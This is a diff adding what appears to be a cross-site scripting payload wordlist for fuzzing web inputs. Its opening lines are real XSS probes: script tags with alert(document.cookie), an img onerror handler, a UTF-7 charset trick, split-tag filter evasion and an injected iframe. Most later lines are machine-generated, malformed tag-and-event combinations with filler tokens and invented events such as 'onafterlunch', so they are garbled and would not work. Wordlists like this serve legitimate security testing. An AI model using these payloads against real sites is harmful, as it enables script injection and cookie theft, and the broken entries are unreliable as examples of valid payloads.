@@ -1,0 +1,107 @@
+<script>alert(0)</script>
+<script>alert(\"hacked\");</script>
+<script>alert('hacked')</script>
+<iframe src=\"http://www.cnn.com\"></iframe>
+<script>alert(document.cookie)</script>
+<script language=\"javascript\">alert(document.cookie)</script>
+<script language=\"javascript\">alert(\"hacked\")</script>
+<script> alert(String.fromCharCode(88,83))</script> 
+\"><script>alert('hacked')</script>
+\"><img src=\"u.png\" onerror=\"alert('hacked');\"</script>
+<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+<img src=javascript:alert('hacked'); />
+<scr</script>ipt>alert('hacked')</scr</script>ipt>
+\"><img src=\"u.png\" onerror=\"alert('hacked');\"</script>
+<SCRIPT>alert('hacked')</SCRIPT>
+</TITLE><SCRIPT>alert('hacked');</SCRIPT>
+<BODY ONLOAD=alert('XSSed')>
+<img>' onmouseover'alert(0)</img>
+<frame>nil onerrornilalert(document.cookie)</frame>
+<src>'' onfire''"alert(\"hacked\")"</src>
+<script>' onbeforeloadnilalert('hacked')</script>
+<body>nil onafterload''alert(1)</body>
+<HEAD>'' onafterlunchnilalert(0)</HEAD>
+<BODY>' onload''alert(document.cookie)</BODY>
+<iframe>nil onchange'"alert(\"hacked\")"</iframe>
+<IFRAME>'' onclick'alert('hacked')</IFRAME>
+<SCRIPT>'' onmouseovernilalert(1)</SCRIPT>
+<img>nil onclick''alert(document.cookie)</img>
+<frame>' onclick'"alert(\"hacked\")"</frame>
+<src>' onclicknilalert(1)</src>
+<script>nil onclick''alert(0)</script>
+<body>'' onclick'alert('hacked')</body>
+<HEAD>' onclick'alert(1)</HEAD>
+<BODY>nil onclicknilalert(0)</BODY>
+<iframe>'' onclick''alert(document.cookie)</iframe>
+<SCRIPT>' onclick'"alert(\"hacked\")"</SCRIPT>
+<frame>nil onmouseover''alert('hacked')</frame>
+<src>nil onmouseover'alert(document.cookie)</src>
+<script>'' onmouseover'"alert(\"hacked\")"</script>
+<body>' onmouseovernilalert(0)</body>
+<HEAD>nil onmouseover''alert('hacked')</HEAD>
+<BODY>'' onmouseover'alert(1)</BODY>
+<iframe>' onmouseovernilalert(0)</iframe>
+<IFRAME>nil onmouseover''alert(document.cookie)</IFRAME>
+<img>'' onerrornil"alert(\"hacked\")"</img>
+<src>' onerror''alert('hacked')</src>
+<script>' onerror'alert(1)</script>
+<body>'' onerrornilalert(document.cookie)</body>
+<HEAD>'' onerror'"alert(\"hacked\")"</HEAD>
+<BODY>' onerror''alert('hacked')</BODY>
+<iframe>nil onerror'alert(1)</iframe>
+<IFRAME>' onerrornilalert(0)</IFRAME>
+<SCRIPT>nil onerror''alert(document.cookie)</SCRIPT>
+<img>' onfirenilalert('hacked')</img>
+<frame>'' onfire'alert(1)</frame>
+<script>nil onfirenilalert(document.cookie)</script>
+<body>'' onfire'"alert(\"hacked\")"</body>
+<HEAD>'' onfirenilalert(document.cookie)</HEAD>
+<BODY>' onfire''"alert(\"hacked\")"</BODY>
+<iframe>'' onfire'alert('hacked')</iframe>
+<IFRAME>nil onfire'alert(1)</IFRAME>
+<SCRIPT>'' onfire'alert(0)</SCRIPT>
+<img>'' onbeforeload''alert(1)</img>
+<frame>nil onbeforeload'alert(0)</frame>
+<src>' onbeforeloadnilalert(0)</src>
+<body>'' onbeforeloadnil"alert(\"hacked\")"</body>
+<HEAD>nil onbeforeload'alert(document.cookie)</HEAD>
+<BODY>nil onbeforeloadnilalert('hacked')</BODY>
+<iframe>'' onbeforeloadnil"alert(\"hacked\")"</iframe>
+<IFRAME>'' onbeforeload''"alert(\"hacked\")"</IFRAME>
+<SCRIPT>'' onbeforeloadnilalert('hacked')</SCRIPT>
+<img>'' onafterloadnilalert(0)</img>
+<frame>' onafterload'alert('hacked')</frame>
+<src>'' onafterload''alert(document.cookie)</src>
+<script>nil onafterload'"alert(\"hacked\")"</script>
+<HEAD>' onafterload''alert(1)</HEAD>
+<BODY>nil onafterload''alert('hacked')</BODY>
+<iframe>' onafterload'"alert(\"hacked\")"</iframe>
+<IFRAME>' onafterload''alert(document.cookie)</IFRAME>
+<SCRIPT>'' onafterloadnilalert(0)</SCRIPT>
+<img>nil onafterlunch''alert(1)</img>
+<frame>' onafterlunch'alert('hacked')</frame>
+<src>'' onafterlunchnilalert(document.cookie)</src>
+<script>'' onafterlunch'"alert(\"hacked\")"</script>
+<body>'' onafterlunch''alert(1)</body>
+<BODY>'' onafterlunch'alert(document.cookie)</BODY>
+<iframe>'' onafterlunch'alert(document.cookie)</iframe>
+<IFRAME>' onafterlunch''"alert(\"hacked\")"</IFRAME>
+<SCRIPT>nil onafterlunch''alert('hacked')</SCRIPT>
+<img>'' onloadnilalert(1)</img>
+<frame>nil onload'alert(0)</frame>
+<src>'' onload''alert('hacked')</src>
+<script>' onload'"alert(\"hacked\")"</script>
+<body>' onload'"alert(\"hacked\")"</body>
+<HEAD>nil onloadnilalert(0)</HEAD>
+<iframe>nil onload''alert('hacked')</iframe>
+<IFRAME>' onload''"alert(\"hacked\")"</IFRAME>
+<SCRIPT>' onload'alert('hacked')</SCRIPT>
+<img>'' onchangenilalert(1)</img>
+<frame>' onchange''alert(0)</frame>
+<src>nil onchangenilalert(document.cookie)</src>
+<script>' onchange'alert('hacked')</script>
+<body>'' onchange''alert(document.cookie)</body>
+<HEAD>'' onchange''"alert(\"hacked\")"</HEAD>
+<BODY>'' onchangenilalert(document.cookie)</BODY>
+<IFRAME>nil onchange'alert(document.cookie)</IFRAME>
+<SCRIPT>'' onchange''alert('hacked')</SCRIPT>
